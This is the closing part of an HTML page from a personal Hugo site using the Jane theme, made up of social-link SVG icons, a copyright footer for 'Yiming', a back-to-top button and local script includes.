  <path d="M351.791182 562.469462l192.945407 0c0-45.367257-21.3871-71.939449-21.3871-71.939449L355.897709 490.530013c3.977591-82.182744 7.541767-187.659007 8.816806-226.835262l159.282726 0c0 0-0.86367-67.402109-18.578124-67.402109s-279.979646 0-279.979646 0 16.850783-88.141456 39.318494-127.053698c0 0-83.60514-4.510734-112.121614 106.962104S81.344656 355.077018 76.80834 367.390461c-4.536316 12.313443 24.62791 5.832845 36.941354 0 12.313443-5.832845 68.050885-25.924439 84.252893-103.69571l86.570681 0c1.165546 49.28652 4.596691 200.335724 3.515057 226.835262L109.86113 490.530013c-25.275663 18.147312-33.701566 71.939449-33.701566 71.939449L279.868105 562.469462c-8.497535 56.255235-23.417339 128.763642-44.275389 167.210279-33.05279 60.921511-50.55235 116.65793-169.802314 212.576513 0 0-19.442818 14.257725 40.829917 9.073656 60.273758-5.185093 117.305683-20.739347 156.840094-99.807147 20.553105-41.107233 41.805128-93.250824 58.386782-146.138358l-0.055259 0.185218 167.855986 193.263655c0 0 22.035876-51.847855 5.832845-108.880803L371.045711 650.610918l-42.1244 31.157627-0.045025 0.151449c11.69946-41.020252 20.11206-81.5749 22.726607-116.858498C351.665315 564.212152 351.72876 563.345412 351.791182 562.469462z"></path>
  <path d="M584.918753 182.033893l0 668.840094 70.318532 0 28.807093 80.512708 121.875768-80.512708 153.600307 0L959.520453 182.033893 584.918753 182.033893zM887.150192 778.934538l-79.837326 0-99.578949 65.782216-23.537066-65.782216-24.855084 0L659.341766 256.673847l227.807403 0L887.149169 778.934538z"></path>
</svg>

    </a>
  
    <a href="https://www.instagram.com/shenyimings/" rel="me noopener" class="iconfont"
      title="instagram"  target="_blank"
      >
      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="36" height="36">
  <path d="M853.333333 277.333333C853.333333 289.28 843.946667 298.666667 832 298.666667L746.666667 298.666667C734.72 298.666667 725.333333 289.28 725.333333 277.333333L725.333333 192C725.333333 180.053333 734.72 170.666667 746.666667 170.666667L832 170.666667C843.946667 170.666667 853.333333 180.053333 853.333333 192M192 853.333333C180.053333 853.333333 170.666667 843.946667 170.666667 832L170.666667 469.333333 259.84 469.333333C257.28 482.986667 256 497.493333 256 512 256 653.226667 370.773333 768 512 768 653.226667 768 768 653.226667 768 512 768 497.493333 766.293333 482.986667 764.16 469.333333L853.333333 469.333333 853.333333 832C853.333333 843.946667 843.946667 853.333333 832 853.333333M512 341.333333C606.293333 341.333333 682.666667 417.706667 682.666667 512 682.666667 606.293333 606.293333 682.666667 512 682.666667 417.706667 682.666667 341.333333 606.293333 341.333333 512 341.333333 417.706667 417.706667 341.333333 512 341.333333M853.333333 85.333333 170.666667 85.333333C123.306667 85.333333 85.333333 123.306667 85.333333 170.666667L85.333333 853.333333C85.333333 900.266667 123.733333 938.666667 170.666667 938.666667L853.333333 938.666667C900.266667 938.666667 938.666667 900.266667 938.666667 853.333333L938.666667 170.666667C938.666667 123.306667 900.266667 85.333333 853.333333 85.333333Z"></path>
</svg>

    </a>


<a href="https://shenyimings.github.io/index.xml" rel="noopener alternate" type="application/rss&#43;xml"
    class="iconfont" title="rss" target="_blank">
    <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="30" height="30">
  <path d="M819.157333 1024C819.157333 574.592 449.408 204.8 0 204.8V0c561.706667 0 1024 462.293333 1024 1024h-204.842667zM140.416 743.04a140.8 140.8 0 0 1 140.501333 140.586667A140.928 140.928 0 0 1 140.074667 1024C62.72 1024 0 961.109333 0 883.626667s62.933333-140.544 140.416-140.586667zM678.784 1024h-199.04c0-263.210667-216.533333-479.786667-479.744-479.786667V345.173333c372.352 0 678.784 306.517333 678.784 678.826667z"></path>
</svg>

  </a>
   
</div>

<div class="copyright">
  <span class="power-by">
    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
  </span>
  <span class="division">|</span>
  <span class="theme-info">
    Theme - <a class="theme-link" href="https://github.com/xianmin/hugo-theme-jane">Jane</a>
  </span>

  <span class="copyright-year">
    &copy;
    
      2021 -
    2022
    <span class="heart">
      
      <i class="iconfont">
        <svg class="icon" viewBox="0 0 1025 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="14" height="14">
  <path d="M1000.1 247.9c-15.5-37.3-37.6-70.6-65.7-98.9-54.4-54.8-125.8-85-201-85-85.7 0-166 39-221.4 107.4C456.6 103 376.3 64 290.6 64c-75.1 0-146.5 30.4-201.1 85.6-28.2 28.5-50.4 61.9-65.8 99.3-16 38.8-24 79.9-23.6 122.2 0.7 91.7 40.1 177.2 108.1 234.8 3.1 2.6 6 5.1 8.9 7.8 14.9 13.4 58 52.8 112.6 102.7 93.5 85.5 209.9 191.9 257.5 234.2 7 6.1 15.8 9.5 24.9 9.5 9.2 0 18.1-3.4 24.9-9.5 34.5-30.7 105.8-95.9 181.4-165 74.2-67.8 150.9-138 195.8-178.2 69.5-57.9 109.6-144.4 109.9-237.3 0.1-42.5-8-83.6-24-122.2z"
   fill="#8a8a8a"></path>
</svg>

      </i>
    </span><span class="author">
        Yiming
        
      </span></span>

  
  

  
</div>

    </footer>

    <div class="back-to-top" id="back-to-top">
      <i class="iconfont">
        
        <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="35" height="35">
  <path d="M510.866688 227.694839 95.449397 629.218702l235.761562 0-2.057869 328.796468 362.40389 0L691.55698 628.188232l241.942331-3.089361L510.866688 227.694839zM63.840492 63.962777l894.052392 0 0 131.813095L63.840492 195.775872 63.840492 63.962777 63.840492 63.962777zM63.840492 63.962777"></path>
</svg>

      </i>
    </div>
  </div>
  
<script type="text/javascript" src="/lib/jquery/jquery-3.2.1.min.js"></script>
  <script type="text/javascript" src="/lib/slideout/slideout-1.0.1.min.js"></script>




<script type="text/javascript" src="/js/main.dee43230127a73d039a734510fa896c89c3c7ce0cf0be0c7a7433f8fd69b76dc.js" integrity="sha256-3uQyMBJ6c9A5pzRRD6iWyJw8fODPC&#43;DHp0M/j9abdtw=" crossorigin="anonymous"></script>












  
    <script type="text/javascript" src="/js/load-photoswipe.js"></script>
    <script type="text/javascript" src="/lib/photoswipe/photoswipe.min.js"></script>
    <script type="text/javascript" src="/lib/photoswipe/photoswipe-ui-default.min.js"></script>
  















</body>
</html>
